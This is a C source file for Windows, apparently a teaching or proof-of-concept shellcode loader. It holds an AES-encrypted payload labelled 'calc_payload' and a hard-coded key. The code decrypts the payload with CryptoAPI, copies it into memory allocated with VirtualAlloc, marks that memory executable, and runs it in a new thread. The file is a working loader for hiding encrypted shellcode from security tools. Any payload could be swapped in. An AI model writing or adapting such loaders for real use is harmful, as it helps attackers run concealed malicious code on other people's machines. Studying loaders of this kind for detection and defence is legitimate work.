#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { 0xdc, 0x5f, 0x2c, 0x16, 0x7f, 0x92, 0xc3, 0x22, 0x1f, 0x93, 0xbd, 0x38, 0x8d, 0x32, 0x41, 0x25 };
	unsigned char calc_payload[] = { 0xf1, 0x2, 0x46, 0x7c, 0x43, 0xc2, 0xe8, 0xff, 0xfd, 0x67, 0x9d, 0xc, 0x45, 0xf9, 0x46, 0x84, 0xcc, 0x9d, 0x41, 0xa1, 0x18, 0x77, 0x97, 0x61, 0x53, 0xb5, 0x84, 0x74, 0x82, 0x1a, 0xa7, 0xbc, 0xb4, 0xa2, 0xd4, 0x1c, 0xcc, 0x35, 0x9a, 0x23, 0x9f, 0x56, 0xfe, 0xcd, 0xe8, 0xd3, 0xc8, 0x5c, 0xe1, 0x35, 0x22, 0x89, 0x7d, 0x57, 0x3f, 0x7d, 0xde, 0xb0, 0x8b, 0x8d, 0x63, 0x8b, 0xad, 0xbe, 0x77, 0x27, 0xf, 0x4d, 0xd8, 0x28, 0x2d, 0xf5, 0x59, 0x1a, 0x58, 0x24, 0x6b, 0x2b, 0x3a, 0xa7, 0x77, 0x44, 0xbc, 0x60, 0x70, 0x34, 0x83, 0xa6, 0xc9, 0xc8, 0x1e, 0x59, 0xa9, 0xed, 0x51, 0x18, 0x4e, 0xf4, 0xab, 0x29, 0xb4, 0x44, 0xd5, 0x2b, 0x76, 0x69, 0x15, 0x88, 0x5a, 0x15, 0x39, 0xe, 0x88, 0x41, 0x4d, 0xb, 0x22, 0xce, 0x26, 0xa3, 0x27, 0x5a, 0xcb, 0xa2, 0xbe, 0x1e, 0xa6, 0xa5, 0x93, 0x4d, 0xcf, 0xa7, 0xb8, 0xdf, 0xb1, 0xc5, 0x1d, 0xa6, 0xd5, 0x18, 0x13, 0xf2, 0xed, 0xa5, 0x84, 0x64, 0x4c, 0x8e, 0xc2, 0x85, 0x39, 0x16, 0x49, 0xa5, 0x53, 0x42, 0xe7, 0xe0, 0x68, 0x8a, 0xf, 0x4b, 0xd3, 0xb1, 0x38, 0x77, 0x75, 0x1, 0xae, 0xc9, 0xab, 0xfb, 0x5, 0x8, 0xb, 0x81, 0x8d, 0x39, 0xd9, 0x11, 0xe7, 0xc0, 0xba, 0x1c, 0x97, 0x7e, 0x3e, 0xbf, 0xf, 0xc9, 0xa9, 0xe5, 0xcd, 0xc6, 0x37, 0x6b, 0xd9, 0x4a, 0x13, 0x3, 0x61, 0x5b, 0xc3, 0xa9, 0xcd, 0x4a, 0x86, 0x68, 0x99, 0x8, 0x76, 0xd3, 0x8e, 0x7a, 0xb0, 0x97, 0x74, 0x10, 0x7e, 0x22, 0x69, 0xf, 0x56, 0x34, 0x2b, 0x89, 0xc6, 0x6b, 0xa8, 0x5e, 0x75, 0xb, 0x61, 0xfb, 0x1c, 0x53, 0xb8, 0xdf, 0x91, 0xc5, 0x1d, 0xb0, 0xcc, 0x77, 0xe0, 0xf7, 0x8b, 0xb1, 0x6d, 0xc2, 0x4a, 0x66, 0xd7, 0x80, 0x66, 0x65, 0x35, 0x26, 0x76, 0xc6, 0xfd, 0xfc, 0xa8, 0xce, 0x9e, 0x45, 0x13, 0x46, 0xc, 0xcf, 0x90, 0x1c, 0x44, 0x74, 0x9c, 0xa0, 0x80, 0x69, 0xc2, 0x25, 0x9f, 0x55, 0xa, 0x26, 0xb6, 0x93, 0xc5, 0x93 };
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
